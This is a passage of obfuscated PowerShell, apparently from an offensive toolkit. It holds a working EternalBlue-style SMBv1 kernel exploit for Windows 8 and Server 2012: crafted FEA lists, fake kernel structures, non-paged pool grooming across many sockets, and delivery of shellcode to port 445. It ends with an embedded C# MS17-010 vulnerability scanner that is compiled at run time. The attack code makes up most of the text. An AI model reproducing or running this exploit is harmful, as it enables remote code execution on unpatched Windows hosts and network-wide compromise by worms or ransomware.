	$ntfea9000 +=0x00,0x00,0x5c,0x73+[byte[]]0x00*0x735d
	$ntfea9000 +=0x00,0x00,0x47,0x81+[byte[]]0x00*0x8148


    $TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000
    $SHELLCODE_PAGE_ADDR =  0xffffffffffd04000
    $PTE_ADDR=0xfffff6ffffffe820

    $fakeSrvNetBufferX64Nx =@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa8,0xe7,0xff,0xff,0xff,0xf6,0xff,0xff)

    [byte[]]$feaListNx=[byte[]](0x00,0x00,0x01,0x00)
    $feaListNx += $ntfea9000
    $feaListNx +=0x00,0x00,0xaf,0x00+ $fakeSrvNetBufferX64Nx
    $feaListNx +=0x12,0x34,0x78,0x56
    [byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x41,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x7e,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x41,0xd0,0xff,0xff,0xff,0xff,0xff)
    $feaList = creaTEfEAliST8 $sc.length  $ntfea9000

    $client = NEw-ObjeCT System.Net.Sockets.TcpClient($target,445)
    $sock = $client.Client
    CLIeNt_nEgOTIATe8 $sock $true | oUt-nULl
    $raw, $smbheader = SmB1_LOgin8 $sock
    $os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()
	if ($os.contains(('windows 10 ')))
    {
        $b=[int]$os.split(" ")[-1]
        if ($b -ge 14393) {return $False}
    }

    if (!(($os.contains(('windows 8'))) -or ($os.contains(('windows')) -and $os.contains(('2012')))))
    {return $False}
	$sock.ReceiveTimeout =5000
    $raw, $smbheader = TReE_coNNecT_anDX8 $sock $target $smbheader.user_id


    $progress , $timeout= SEnd_big_TrANS28 $sock $smbheader $feaList ($feaList.length%4096) $False
    if (($progress -eq -1) -and ($timeout -eq -1))
    {return $false}

    $client2 = New-OBJECt System.Net.Sockets.TcpClient($target,445)
    $sock2 = $client2.Client
    ClieNT_NeGOTiAte8 $sock2 $true | oUT-NULL
    $raw, $smbheader_t = SMb1_LOgin8 $sock2
    $raw, $smbheader2 = TRee_CoNnECT_ANDx8 $sock2 $target $smbheader_t.user_id
    $progress2 , $timeout2= sEnd_biG_TrAns28 $sock2 $smbheader2 $feaListNx ($feaList.length%4096) $False
    if (($progress2 -eq -1) -and ($timeout2 -eq -1))
    {return $false}


    $allocConn = cREATESessioNALlOCNONpAgeD8 $target ($NTFEA_SIZE8 - 0x2010)

     $payload_hdr_pkt = maKE_SMB2_PAYloaD_HEaDERS_pACKEt8($true)
     $groom_socks =@()
     for ($i=0; $i -lt 13; $i++)
     {
        $client = nEW-obJecT System.Net.Sockets.TcpClient($target,445)
        $client.NoDelay = $true
        $gsock = $client.Client
        $groom_socks += $gsock
        $gsock.Send($payload_hdr_pkt) | oUt-nULL
     }
    $holeConn = CreAtesEsSIoNAlLOCnoNpAGEd8 $target ($NTFEA_SIZE8 - 0x10)
    $allocConn.close()
    for ($i=0; $i -lt 5; $i++)
     {
         $client = NEW-oBjeCT System.Net.Sockets.TcpClient($target,445)
         $client.NoDelay = $true
         $gsock = $client.Client
         $groom_socks += $gsock
         $gsock.Send($payload_hdr_pkt) | ouT-null
     }
    $holeConn.close()

    $trans2_pkt2 = Make_SMB1_TRans2_ExPloIT_PACKET8 $smbheader2.tree_id $smbheader2.user_id $feaListNx[$progress2..$feaListNx.count] $timeout2
    $sock2.Send($trans2_pkt2) | ouT-nuLl
    $raw2, $transheader2 = SmB1_gET_REspONse8($sock2)
    if ($raw2 -eq -1 -and ($transheader2 -eq -1)){return $false}
    foreach ($sk in $groom_socks)
    {
        $sk.Send([byte[]]0x00) | oUT-NuLL
    }

    $trans2_pkt =MAkE_smB1_TraNS2_eXplOIT_pAcKeT8 $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout
    $sock.Send($trans2_pkt) | ouT-nuLl
    $raw, $transheader = sMB1_Get_ReSPonse8($sock)
    if ($raw -eq -1 -and ($transheader -eq -1)){return $false}
    foreach ($sk in $groom_socks)
    {
        $sk.Send($fake_recv_struct + $sc) | oUT-NuLl
    }
     foreach ($sk in $groom_socks)
    {
        $sk.close() | oUt-nUlL
    }
    $sock.Close()| oUT-nULL
    return $true
  }


$Source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace PingCastle.Scanners
{
	public class m17sc
	{
		static public bool Scan(string computer)
		{
			TcpClient client = new TcpClient();
			client.Connect(computer, 445);
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] negotiatemessage = GetNegotiateMessage();
				stream.Write(negotiatemessage, 0, negotiatemessage.Length);
				stream.Flush();
				byte[] response = ReadSmbResponse(stream);
				if (!(response[8] == 0x72 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid negotiate response");
				}
				byte[] sessionSetup = GetSessionSetupAndXRequest(response);
				stream.Write(sessionSetup, 0, sessionSetup.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x73 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid sessionSetup response");
				}
				byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);
				stream.Write(treeconnect, 0, treeconnect.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x75 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid TreeConnect response");
				}
				byte[] peeknamedpipe = GetPeekNamedPipe(response);
				stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (response[8] == 0x25 && response[9] == 0x05 && response[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )
				{
					return true;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return false;
		}

		private static byte[] ReadSmbResponse(NetworkStream stream)
		{
			byte[] temp = new byte[4];
			stream.Read(temp, 0, 4);
			int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;
			byte[] output = new byte[size + 4];
			stream.Read(output, 4, size);
			Array.Copy(temp, output, 4);
			return output;
		}

		static byte[] GetNegotiateMessage()
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x72,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				0x00,0x00,
				0x44,0x6d,
				0x00,0x00,
				0x42,0xc1,
				0x00,
				0x31,0x00,
				0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00,
				0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00,
				0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00,
				0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,
			};
			return EncodeNetBiosLength(output);
		}

		static byte[] GetSessionSetupAndXRequest(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x73,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x0d,
				0xff,
				0x00,
				0x00,0x00,
				0xdf,0xff,
				0x02,0x00,
				0x01,0x00,
				0x00,0x00,0x00,0x00,
				0x00,0x00,
				0x00,0x00,
				0x00,0x00,0x00,0x00,
				0x40,0x00,0x00,0x00,
				0x26,0x00,
				0x00,
				0x2e,0x00,
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00,
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00
			};
			return EncodeNetBiosLength(output);
		}

		private static byte[] EncodeNetBiosLength(byte[] input)
		{
			byte[] len = BitConverter.GetBytes(input.Length-4);
			input[3] = len[0];
			input[2] = len[1];
			input[1] = len[2];
			return input;
		}

		static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);
			byte[] part1 = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x75,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x04,
				0xff,
				0x00,
				0x00,0x00,
				0x00,0x00,
				0x01,0x00,
				0x19,0x00,
				0x00,
				0x5c,0x5c};
			byte[] part2 = new byte[] {
				0x5c,0x49,0x50,0x43,0x24,0x00,
				0x3f,0x3f,0x3f,0x3f,0x3f,0x00
			};
			ms.Write(part1, 0, part1.Length);
			byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);
			ms.Write(encodedcomputer, 0, encodedcomputer.Length);
			ms.Write(part2, 0, part2.Length);
			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return EncodeNetBiosLength(output);
		}

		static byte[] GetPeekNamedPipe(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x25,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x10,
				0x00,0x00,
				0x00,0x00,
				0xff,0xff,
				0xff,0xff,
				0x00,
				0x00,
				0x00,0x00,
				0x00,0x00,0x00,0x00,
				0x00,0x00,
				0x00,0x00,
				0x4a,0x00,
				0x00,0x00,
				0x4a,0x00,
				0x02,
				0x00,
				0x23,0x00,
				0x00,0x00,
				0x07,0x00,
				0x5c,0x50,0x49,0x50,0x45,0x5c,0x00
			};
			return EncodeNetBiosLength(output);
		}
	}
}
"@
add-TypE -TypeDefinition $Source

